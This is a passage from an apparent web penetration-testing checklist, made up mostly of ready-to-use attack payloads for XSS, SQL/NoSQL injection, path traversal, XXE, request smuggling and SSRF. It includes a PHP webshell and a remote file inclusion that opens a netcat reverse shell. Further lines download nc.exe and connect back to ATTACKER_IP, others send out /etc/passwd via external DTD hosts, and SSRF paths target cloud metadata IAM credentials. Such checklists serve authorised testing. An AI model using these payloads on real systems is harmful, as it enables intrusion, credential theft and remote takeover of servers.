        # If web app allows for zip upload then rename the file to pwd.jpg bcoz developer handle it via command
        # upload the file using SQL command 'sleep(10).jpg you may achieve SQL if image directly saves to DB.
        
        # Advance Bypassing techniques
        # Imagetragick aka ImageMagick:
        https://mukarramkhalid.com/imagemagick-imagetragick-exploit/
        https://github.com/neex/gifoeb
            
        # Upload file tool
        https://github.com/almandin/fuxploider
        python3 fuxploider.py --url https://example.com --not-regex "wrong file type"
        
        https://github.com/sAjibuu/upload_bypass
        ```
        
- CSRF Testing
    - Application has Anti-CSRF token implemented
        - [ ]  Removing the Anti-CSRF Token
        - [ ]  Altering the Anti-CSRF Token
        - [ ]  Using the Attacker’s Anti-CSRF Token
        - [ ]  Spoofing the Anti-CSRF Token
        - [ ]  Using guessable Anti-CSRF Tokens
        - [ ]  Stealing Anti-CSRF Tokens
    - Application uses Double Submit Cookie
        - [ ]  Check for session fixation on subdomains
        - [ ]  Man in the the middle attack
    - Application validates the Referrer or the Origin of the request received
        - [ ]  Restricting the CSRF POC from sending the Referrer header
        - [ ]  Bypass the whitelisting/blacklisting mechanism used by the application
    - Sending data in JSON/XML format
        - [ ]  By using normal HTML Form1
        - [ ]  By using normal HTML Form2 (By Fetch Request)
        - [ ]  By using XMLHTTP Request/AJAX request
        - [ ]  By using Flash file
    - Samesite Cookie attribute
        - [ ]  SameSite Lax bypass via method override
        - [ ]  SameSite Strict bypass via client-side redirect
        - [ ]  SameSite Strict bypass via sibling domain
        - [ ]  SameSite Lax bypass via cookie refresh
- Cross-origin resource sharing (CORS)
    - [ ]  Errors parsing Origin headers
    - [ ]  Whitelisted null origin value
- Cross-Site Scripting Testing
    - [ ]  https://pentestbook.six2dez.com/enumeration/web/xss
    - [ ]  Try XSS using QuickXSS tool by theinfosecguy
    - [ ]  Upload file using '"><img src=x onerror=alert(document.domain)>.txt
    - [ ]  If script tags are banned, use <h1> and other HTML tags
    - [ ]  If output is reflected back inside the JavaScript as a value of any variable just use alert(1)
    - [ ]  if " are filtered then use this payload /><img src=d onerror=confirm(/tushar/);>
    - [ ]  Upload a JavaScript using Image file
    - [ ]  Unusual way to execute your JS payload is to change method from POST to GET. It bypasses filters sometimes
    - Tag attribute value
        - [ ]  Input landed -<input type=”text” name=”state” value=”INPUT_FROM_ USER”>
        - [ ]  Payload to be inserted -“ onfocus=”alert(document.cookie)"
    - [ ]  Syntax Encoding payload “%3cscript%3ealert(document.cookie)%3c/script%3e"
    - XSS filter evasion
        - [ ]  < and > can be replace with html entities < and >
        - [ ]  You can try an XSS [polyglot.Eg](http://polyglot.eg/):-javascript:/*></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
    - XSS Firewall Bypass
        - [ ]  Check if the firewall is blocking only lowercase
        - [ ]  Try to break firewall regex with the new line(\r\n)
        - [ ]  Try Double Encoding
        - [ ]  Testing for recursive filters
        - [ ]  Injecting anchor tag without whitespaces
        - [ ]  Try to bypass whitespaces using Bullet
        - [ ]  Try to change request method
- LDAP Injection
    - [ ]  LDAP injection to bypass authentication
    - [ ]  LDAP injection to exfiltrate data
- [ ]  Fuzz all request parameters (if got user, add headers to fuzzer)
- [ ]  Identify all reflected data
- SQL Injection Testing
    - NoSQL injection
        
        ```jsx
        # Tools
        # https://github.com/codingo/NoSQLMap
        python NoSQLMap.py
        # https://github.com/torque59/Nosql-Exploitation-Framework
        python nosqlframework.py -h
        # https://github.com/Charlie-belmer/nosqli
        nosqli scan -t http://localhost:4000/user/lookup?username=test
        # https://github.com/FSecureLABS/N1QLMap
        ./n1qlMap.py http://localhost:3000 --request example_request_1.txt --keyword beer-sample --extract travel-sample
        
        # Payload: 
        ' || 'a'=='a
        
        mongodbserver:port/status?text=1
        
        # in URL
        username[$ne]=toto&password[$ne]=toto
        
        ##in JSON
        {"username": {"$ne": null}, "password": {"$ne": null}}
        {"username": {"$gt":""}, "password": {"$gt":""}}
        
        - Trigger MongoDB syntax error -> ' " \ ; { }
        - Insert logic -> ' || '1' == '1' ; //
        - Comment out -> //
        - Operators -> $where $gt $lt $ne $regex
        - Mongo commands -> db.getCollectionNames()
        ```
        
    - [ ]  [SQL](https://pentestbook.six2dez.com/enumeration/web/sqli) injection with ' and '--+-
    - Entry point detection
        - [ ]  Simple characters
        - [ ]  Multiple encoding
        - [ ]  Merging characters
        - [ ]  Logic Testing
        - [ ]  Weird characters
    - [ ]  Run SQL injection scanner on all requests
    - [ ]  SQL injection via User-Agent Header
    - Bypassing WAF
        - [ ]  Using Null byte before SQL query
        - [ ]  Using SQL inline comment sequence
        - [ ]  URL encoding
        - [ ]  Changing Cases (uppercase/lowercase)
        - [ ]  Use SQLMAP tamper scripts
    - Time Delays
        
        ```markup
              Oracle 	      dbms_pipe.receive_message(('a'),10)
        
              Microsoft 	  WAITFOR DELAY '0:0:10'
        
              PostgreSQL 	  SELECT pg_sleep(10)
        
              MySQL 	      SELECT sleep(10)
        
        ```
        
    - Conditional Delays
        
        ```markup
              Oracle 	      SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
        
              Microsoft 	  IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
        
              PostgreSQL 	  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
        
              MySQL 	      SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
        
        ```
        
- HTTP header injection in GET & POST (X Forwarded Host)
    - Host Header Injection
        - [ ]  Supply an arbitrary Host header
        - [ ]  Check for flawed validation
        - Send ambiguous requests
            - [ ]  Inject duplicate Host headers
            - [ ]  Supply an absolute URL
            - [ ]  Add line wrapping
        - [ ]  Inject host override headers
    
    ```jsx
    # Add something like 127.0.0.1, localhost, 192.168.1.2, target.com or /admin, /console
    Client-IP:
    Connection:
    Contact:
    Forwarded:
    From:
    Host:
    Origin:
    Referer:
    True-Client-IP:
    X-Client-IP:
    X-Custom-IP-Authorization:
    X-Forward-For:
    X-Forwarded-For:
    X-Forwarded-Host:
    X-Forwarded-Server:
    X-Host:
    X-Original-URL:
    X-Originating-IP:
    X-Real-IP:
    X-Remote-Addr:
    X-Remote-IP:
    X-Rewrite-URL:
    X-Wap-Profile:
    
    # Try to repeat same Host header 2 times
    Host: legit.com
    Stuff: stuff
    Host: evil.com
    
    # Bypass type limit
    Accept: application/json, text/javascript, */*; q=0.01
    Accept: ../../../../../../../../../etc/passwd{{'
    
    # Try to change the HTTP version from 1.1 to HTTP/0.9 and remove the host header
    
    # 401/403 bypasses 
    # Whitelisted IP 127.0.0.1 or localhost
    Client-IP: 127.0.0.1
    Forwarded-For-Ip: 127.0.0.1
    Forwarded-For: 127.0.0.1
    Forwarded-For: localhost
    Forwarded: 127.0.0.1
    Forwarded: localhost
    True-Client-IP: 127.0.0.1
    X-Client-IP: 127.0.0.1
    X-Custom-IP-Authorization: 127.0.0.1
    X-Forward-For: 127.0.0.1
    X-Forward: 127.0.0.1
    X-Forward: localhost
    X-Forwarded-By: 127.0.0.1
    X-Forwarded-By: localhost
    X-Forwarded-For-Original: 127.0.0.1
    X-Forwarded-For-Original: localhost
    X-Forwarded-For: 127.0.0.1
    X-Forwarded-For: localhost
    X-Forwarded-Server: 127.0.0.1
    X-Forwarded-Server: localhost
    X-Forwarded: 127.0.0.1
    X-Forwarded: localhost
    X-Forwared-Host: 127.0.0.1
    X-Forwared-Host: localhost
    X-Host: 127.0.0.1
    X-Host: localhost
    X-HTTP-Host-Override: 127.0.0.1
    X-Originating-IP: 127.0.0.1
    X-Real-IP: 127.0.0.1
    X-Remote-Addr: 127.0.0.1
    X-Remote-Addr: localhost
    X-Remote-IP: 127.0.0.1
    
    # Fake Origin - make GET request to accesible endpoint with:
    X-Original-URL: /admin
    X-Override-URL: /admin
    X-Rewrite-URL: /admin
    Referer: /admin
    # Also try with absoulte url https:/domain.com/admin
    
    # Method Override
    X-HTTP-Method-Override: PUT
    
    # Provide full path GET
    GET https://vulnerable-website.com/ HTTP/1.1
    Host: evil-website.com
    
    # Add line wrapping
    GET /index.php HTTP/1.1
     Host: vulnerable-website.com
    Host: evil-website.com
    
    # Wordlists
    https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers
    https://github.com/danielmiessler/SecLists/tree/bbb4d86ec1e234b5d3cfa0a4ab3e20c9d5006405/Miscellaneous/web/http-request-headers
    ```
    
- [ ]  RCE via Referer Header
- [ ]  Stored attacks
- [ ]  OS command injection
- Path traversal, LFI and RFI
    
    ```jsx
    # Basic LFI
    curl -s http://10.11.1.111/gallery.php?page=/etc/passwd
    
    # If LFI, also check
    /var/run/secrets/kubernetes.io/serviceaccount
    
    # PHP Filter b64
    http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd && base64 -d savefile.php
    http://10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config
    http://10.11.1.111/maliciousfile.txt%00?page=php://filter/convert.base64-encode/resource=../config.php
    # Nullbyte ending
    http://10.11.1.111/page=http://10.11.1.111/maliciousfile%00.txt
    http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00
    # Other techniques
    https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c
    https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
    https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd
    https://abc.redact.com/static/../../../../../../../../../../../../../../../etc/passwd
    https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00
    https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.html
    https://abc.redact.com/asd.php?file:///etc/passwd
    https://abc.redact.com/asd.php?file:///etc/passwd%00
    https://abc.redact.com/asd.php?file:///etc/passwd%00.html
    https://abc.redact.com/asd.php?file:///etc/passwd%00.ext
    https://abc.redact.com/asd.php?file:///..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.ext/etc/passwd
    https://target.com/admin..;/
    https://target.com/../admin
    https://target.com/whatever/..;/admin
    https://target.com/whatever.php~
    # Cookie based
    GET /vulnerable.php HTTP/1.1
    Cookie:usid=../../../../../../../../../../../../../etc/pasdwd
    # LFI Windows
    http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00
    http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini
    http://10.11.1.111/addguestbook.php?LANG=../../../../../../../../../../../../../../../boot.ini
    http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00
    http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00.html
    http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini
    http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00
    http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.html
    http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini
    http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00
    http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00.html
    http://10.11.1.111/addguestbook.php?LANG=file:///C:/boot.ini
    http://10.11.1.111/addguestbook.php?LANG=file:///C:/win.ini
    http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.ext
    http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00.ext
    
    # LFI using video upload:
    https://github.com/FFmpeg/FFmpeg
    https://hackerone.com/reports/226756
    https://hackerone.com/reports/237381
    https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit
    https://github.com/neex/ffmpeg-avi-m3u-xbin
    
    # Contaminating log files
    root@kali:~# nc -v 10.11.1.111 80
    10.11.1.111: inverse host lookup failed: Unknown host
    (UNKNOWN) [10.11.1.111] 80 (http) open
     <?php echo shell_exec($_GET['cmd']);?> 
    http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig
    
    # Common LFI to RCE:
        Using file upload forms/functions
        Using the PHP wrapper expect://command
        Using the PHP wrapper php://file
        Using the PHP wrapper php://filter
        Using PHP input:// stream
        Using data://text/plain;base64,command
        Using /proc/self/environ
        Using /proc/self/fd
        Using log files with controllable input like:
            /var/log/apache/access.log
            /var/log/apache/error.log
            /var/log/vsftpd.log
            /var/log/sshd.log
            /var/log/mail
    
    # LFI possibilities by filetype
        ASP / ASPX / PHP5 / PHP / PHP3: Webshell / RCE
        SVG: Stored XSS / SSRF / XXE
        GIF: Stored XSS / SSRF
        CSV: CSV injection
        XML: XXE
        AVI: LFI / SSRF
        HTML / JS : HTML injection / XSS / Open redirect
        PNG / JPEG: Pixel flood attack (DoS)
        ZIP: RCE via LFI / DoS
        PDF / PPTX: SSRF / BLIND XXE
        
    # Chaining with other vulns    
    ../../../tmp/lol.png —> for path traversal
    sleep(10)-- -.jpg —> for SQL injection
    <svg onload=alert(document.domain)>.jpg/png —> for XSS
    ; sleep 10; —> for command injections
    
    # 403 bypasses
    /accessible/..;/admin
    /.;/admin
    /admin;/
    /admin/~
    /./admin/./
    /admin?param
    /%2e/admin
    /admin#
    /secret/
    /secret/.
    //secret//
    /./secret/..
    /admin..;/
    /admin%20/
    /%20admin%20/
    /admin%20/page
    /%61dmin
    
    # Path Bypasses
    # 16-bit Unicode encoding
    # double URL encoding
    # overlong UTF-8 Unicode encoding
    ….//
    ….\/
    …./\
    ….\\
    
    # RFI:
    http://10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00
    Content of evil.txt:
    <?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>
    # RFI over SMB (Windows)
    cat php_cmd.php
        <?php echo shell_exec($_GET['cmd']);?>
    # Start SMB Server in attacker machine and put evil script
    # Access it via browser (2 request attack):
    # http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
    # http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234
    
    # Cross Content Hijacking:
    https://github.com/nccgroup/CrossSiteContentHijacking
    https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/
    http://50.56.33.56/blog/?p=242
    
    # Encoding scripts in PNG IDAT chunk:
    https://yqh.at/scripts_in_pngs.php
    ```
    
- [ ]  Script injection
- [ ]  SMTP injection
- [ ]  Native software flaws (buffer overflow, integer bugs, format strings)
- [ ]  SOAP injection
- XPath Injection
    - [ ]  XPath injection to bypass authentication
    - [ ]  XPath injection to exfiltrate data
    - [ ]  Blind and Time-based XPath injections to exfiltrate data
- XML Injection Testing
    - XXE in any request, change content-type to text/xml
        - Tools
            
            https://github.com/BuffaloWill/oxml_xxe
            
            https://github.com/enjoiz/XXEinjector
            
        - Detection
            
            ```jsx
            # Content type "application/json" or "application/x-www-form-urlencoded" to "applcation/xml" or "text/xml".
            # File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files.
            # If svg allowed in picture upload, you can inject xml in svgs.
            # If the web app offers RSS feeds, add your milicious code into the RSS.
            # Fuzz for /soap api, some applications still running soap apis
            # If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse
            ```
            
        - Check
            
            ```jsx
            <?xml version="1.0"?>
            <!DOCTYPE a [<!ENTITY test "THIS IS A STRING!">]>
            <methodCall><methodName>&test;</methodName></methodCall>
            ```
            
        - if works then:
            
            ```jsx
            <?xml version="1.0"?>
            <!DOCTYPE a[<!ENTITY test SYSTEM "file:///etc/passwd">]>
            <methodCall><methodName>&test;</methodName></methodCall>
            ```
            
            ```jsx
            <?xml version="1.0" encoding="ISO 8859 1"?>
            <!DOCTYPE tushar [
            <!ELEMENT tushar ANY
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><tushar>&xxe;</
            <!ENTITY xxe SYSTEM "file:///etc/hosts" >]><tushar>&xxe;</
            <!ENTITY xxe SYSTEM "file:///proc/self/cmdline" >]><tushar>&xxe;</
            <!ENTITY xxe SYSTEM "file:///proc/version" >]><tushar>&xxe;</
            
            ```
            
        - Attacks
            
            ```jsx
            # Get PHP file:
            <?xml version="1.0"?>
            <!DOCTYPE a [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
            <methodCall><methodName>&test;</methodName></methodCall>
            
            # Classic XXE Base64 encoded
            <!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
            
            # Check if entities are enabled
            <!DOCTYPE replace [<!ENTITY test "pentest"> ]>
             <root>
              <xxe>&test;</xxe>
             </root>
            
            # XXE LFI:
            <!DOCTYPE foo [  
            <!ELEMENT foo (#ANY)>
            <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
            
            # XXE Blind LFI:
            <!DOCTYPE foo [
            <!ELEMENT foo (#ANY)>
            <!ENTITY % xxe SYSTEM "file:///etc/passwd">
            <!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
            
            # XXE Access control bypass
            <!DOCTYPE foo [
            <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
            <foo><result>&ac;</result></foo>
            
            # XXE to SSRF:
            <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
            
            # XXE OOB
            <?xml version="1.0"?>
            <!DOCTYPE data [ 
             <!ENTITY % file SYSTEM "file:///etc/passwd">
             <!ENTITY % dtd SYSTEM "http://your.host/remote.dtd"> 
            %dtd;]>
            <data>&send;</data>
            
            # PHP Wrapper inside XXE
            <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
            <contacts>
              <contact>
                <name>Jean &xxe; Dupont</name>
                <phone>00 11 22 33 44</phone>
                <adress>42 rue du CTF</adress>
                <zipcode>75000</zipcode>
                <city>Paris</city>
              </contact>
            </contacts>
            
            <?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY % xxe SYSTEM "php://filter/convert.bae64-encode/resource=http://10.0.0.3" >
            ]>
            <foo>&xxe;</foo>
            
            # Deny Of Service - Billion Laugh Attack
            
            <!DOCTYPE data [
            <!ENTITY a0 "dos" >
            <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
            <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
            <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
            <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
            ]>
            <data>&a4;</data>
            
            # Yaml attack
            
            a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
            b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
            c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
            d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
            e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
            f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
            g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
            h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
            i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
            
            # XXE OOB Attack (Yunusov, 2013)
            
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
            <data>&send;</data>
            
            File stored on http://publicServer.com/parameterEntity_oob.dtd
            <!ENTITY % file SYSTEM "file:///sys/power/image_size">
            <!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
            %all;
            
            # XXE OOB with DTD and PHP filter
            
            <?xml version="1.0" ?>
            <!DOCTYPE r [
            <!ELEMENT r ANY >
            <!ENTITY % sp SYSTEM "http://92.222.81.2/dtd.xml">
            %sp;
            %param1;
            ]>
            <r>&exfil;</r>
            
            File stored on http://92.222.81.2/dtd.xml
            <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
            <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://92.222.81.2/dtd.xml?%data;'>">
            
            # XXE Inside SOAP
            
            <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
            
            # XXE PoC
            
            <!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
            <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
            <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [<!ELEMENT foo ANY><!ENTITY xxe_test SYSTEM "file:///etc/passwd">]><foo>&xxe_test;</foo>
            
            # XXE file upload SVG
            <svg>&xxe;</svg>
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
                <image xlink:href="expect://ls"></image>
            </svg>
            
            <?xml version="1.0" encdoing="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="14" x="0" y="16">&xxe;</text></svg>  
            
            # XXE Hidden Attack
            
            - Xinclude
            
            Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
            Set the value of the productId parameter to:
            <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
            
            - File uploads:
            
            Create a local SVG image with the following content:
            <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
            Post a comment on a blog post, and upload this image as an avatar.
            When you view your comment, you should see the contents of the /etc/hostname file in your image. Then use the "Submit solution" but
            ```
            
    - [ ]  Blind XXE with out-of-band interaction
- [ ]  SSI Injection
- HTTP Request Smuggling
    - Tools
        
        ```jsx
        # https://github.com/defparam/smuggler
        python3 smuggler.py -u <URL>
        # https://github.com/defparam/tiscripts
        
        # https://github.com/anshumanpattnaik/http-request-smuggling/
        python3 smuggle.py -u <URL>
        
        # https://github.com/assetnote/h2csmuggler
        go run ./cmd/h2csmuggler check https://google.com/ http://localhost
        
        # HTTP/2
        # https://github.com/BishopFox/h2csmuggler
        ```
        
    - Samples
        
        ```jsx
        - The Content-Length header is straightforward: it specifies the length of the message body in bytes. For example:
        
            POST /search HTTP/1.1
            Host: normal-website.com
            Content-Type: application/x-www-form-urlencoded
            Content-Length: 11
        
            q=smuggling
        
        - The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:
        
            POST /search HTTP/1.1
            Host: normal-website.com
            Content-Type: application/x-www-form-urlencoded
            Transfer-Encoding: chunked
        
            b
            q=smuggling
            0
        
        • CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
           ◇ Find - time delay:
            POST / HTTP/1.1
            Host: vulnerable-website.com
            Transfer-Encoding: chunked
            Content-Length: 4
        
            1
            A
            X
        • TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
           ◇ Find time delay:
            POST / HTTP/1.1
            Host: vulnerable-website.com
            Transfer-Encoding: chunked
            Content-Length: 6
        
            0
        
            X
        • TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.
        
        - CL.TE
            Using Burp Repeater, issue the following request twice:
            POST / HTTP/1.1
            Host: your-lab-id.web-security-academy.net
            Connection: keep-alive
            Content-Type: application/x-www-form-urlencoded
            Content-Length: 6
            Transfer-Encoding: chunked
        
            0
        
            G
            The second response should say: Unrecognized method GPOST.
        
         - TE.CL
            In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
            Using Burp Repeater, issue the following request twice:
            POST / HTTP/1.1
            Host: your-lab-id.web-security-academy.net
            Content-Type: application/x-www-form-urlencoded
            Content-length: 4
            Transfer-Encoding: chunked
        
            5c
            GPOST / HTTP/1.1
            Content-Type: application/x-www-form-urlencoded
            Content-Length: 15
        
            x=1
            0
        
         - TE.TE: obfuscating TE Header
             In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
            Using Burp Repeater, issue the following request twice:
            POST / HTTP/1.1
            Host: your-lab-id.web-security-academy.net
            Content-Type: application/x-www-form-urlencoded
            Content-length: 4
            Transfer-Encoding: chunked
            Transfer-encoding: cow
        
            5c
            GPOST / HTTP/1.1
            Content-Type: application/x-www-form-urlencoded
            Content-Length: 15
        
            x=1
            0
        ```
        
- [ ]  Code Injection (<h1>JohanyCh</h1> on stored param)
- Server-side request forgery (SSRF)
    - [ ]  Bypassing via open redirection
    - [ ]  SSRF in previously discovered open ports
    - [ ]  Try basic localhost payloads
    - Common injection parameters
        
        ```markup
        "access=",
        "admin=",
        "dbg=",
        "debug=",
        "edit=",
        "grant=",
        "test=",
        "alter=",
        "clone=",
        "create=",
        "delete=",
        "disable=",
        "enable=",
        "exec=",
        "execute=",
        "load=",
        "make=",
        "modify=",
        "rename=",
        "reset=",
        "shell=",
        "toggle=",
        "adm=",
        "root=",
        "cfg=",
        "dest=",
        "redirect=",
        "uri=",
        "path=",
        "continue=",
        "url=",
        "window=",
        "next=",
        "data=",
        "reference=",
        "site=",
        "html=",
        "val=",
        "validate=",
        "domain=",
        "callback=",
        "return=",
        "page=",
        "feed=",
        "host=",
        "port=",
        "to=",
        "out=",
        "view=",
        "dir=",
        "show=",
        "navigation=",
        "open=",
        "file=",
        "document=",
        "folder=",
        "pg=",
        "php_path=",
        "style=",
        "doc=",
        "img=",
        "filename="
        
        ```
        
    - Bypassing filters
        - [ ]  Bypass using HTTPS
        - [ ]  Bypass with [::]
        - [ ]  Bypass with a domain redirection
        - [ ]  Bypass using a decimal IP location
        - [ ]  Bypass using IPv6/IPv4 Address Embedding
        - [ ]  Bypass using malformed urls
        - [ ]  Bypass using rare address(short-hand IP addresses by dropping the zeros)
        - [ ]  Bypass using enclosed alphanumerics
    - Cloud Instances
        - AWS
            
            ```jsx
            <http://instance-data>
            <http://169.254.169.254>
            <http://169.254.169.254/latest/user-data>
            <http://169.254.169.254/latest/user-data/iam/security-credentials/>[ROLE NAME]
            <http://169.254.169.254/latest/meta-data/>
            <http://169.254.169.254/latest/meta-data/iam/security-credentials/>[ROLE NAME]
            <http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance>
            <http://169.254.169.254/latest/meta-data/ami-id>
            <http://169.254.169.254/latest/meta-data/reservation-id>
            <http://169.254.169.254/latest/meta-data/hostname>
            <http://169.254.169.254/latest/meta-data/public-keys/>
            <http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key>
            <http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key>
            <http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy>
            <http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access>
            <http://169.254.169.254/latest/dynamic/instance-identity/document>
            
            ```
            
        - Google Cloud
            
            ```jsx
            <http://169.254.169.254/computeMetadata/v1/>
            <http://metadata.google.internal/computeMetadata/v1/>
            <http://metadata/computeMetadata/v1/>
            <http://metadata.google.internal/computeMetadata/v1/instance/hostname>
            <http://metadata.google.internal/computeMetadata/v1/instance/id>
            <http://metadata.google.internal/computeMetadata/v1/project/project-id>
            
            ```
            
        - Digital Ocean
            
            ```jsx
            curl <http://169.254.169.254/metadata/v1/id>
            <http://169.254.169.254/metadata/v1.json>
            <http://169.254.169.254/metadata/v1/>
            <http://169.254.169.254/metadata/v1/id>
            <http://169.254.169.254/metadata/v1/user-data>
            <http://169.254.169.254/metadata/v1/hostname>
            <http://169.254.169.254/metadata/v1/region>
            <http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address>
            
            ```
            
        - Azure
            
            ```jsx
            <http://169.254.169.254/metadata/v1/maintenance>
            <http://169.254.169.254/metadata/instance?api-version=2017-04-02>
            <http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text>
            
            ```
            
    - Open redirect (SSRF)
        - Attacks
            
            ```jsx
            # Check if you're able to enum IP or ports
            127.0.0.1
            127.0.1
            127.1
            127.000.000.001
